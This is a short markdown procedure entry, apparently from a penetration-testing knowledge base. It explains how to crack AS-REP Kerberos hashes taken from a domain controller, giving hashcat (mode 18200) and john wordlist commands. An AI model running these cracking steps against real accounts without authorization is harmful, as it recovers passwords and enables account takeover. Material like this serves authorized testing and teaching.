---
id: 36b81492-9cb7-4f3a-8ba3-30640f70706a
name: Crack asrep hash
type: procedure
verified: false
submitted: false
created_at: '2023-01-12T00:17:16.545805+00:00'
updated_at: '2023-05-29T16:48:53.253841+00:00'
platforms:
- Linux
- Windows
tags:
- '[[asrep]]'
- '[[hashcat]]'
- '[[john]]'
- '[[password cracking]]'
commands:
- '[[hashcat crack asrep]]'
- '[[john crack asrep]]'
---

# Crack asrep hash

## Summary

Using hashcat to crack asrep hash obtained from impacket or rubeus tools on DC. 

## Description

# Description

Using hashcat to crack asrep hash obtained from impacket or rubeus tools on DC.

## Objective

1. Crack a AS-REP hash using a dictionary to obtain a password for valid credentials

# Instructions

## Use hashcat to crack asrep

**Command** ([[hashcat crack asrep]]):

```bash
hashcat -m 18200 --force -a 0 hashes.text password.txt
```

## Use john to crack asrep

## 

**Command** ([[john crack asrep]]):

```bash
john --wordlist=passwords.text hashes.text
```

## Platforms

- Linux
- Windows

## Commands Used

- [[hashcat crack asrep]]
- [[john crack asrep]]

## Tags

- [[asrep]]
- [[hashcat]]
- [[john]]
- [[password cracking]]
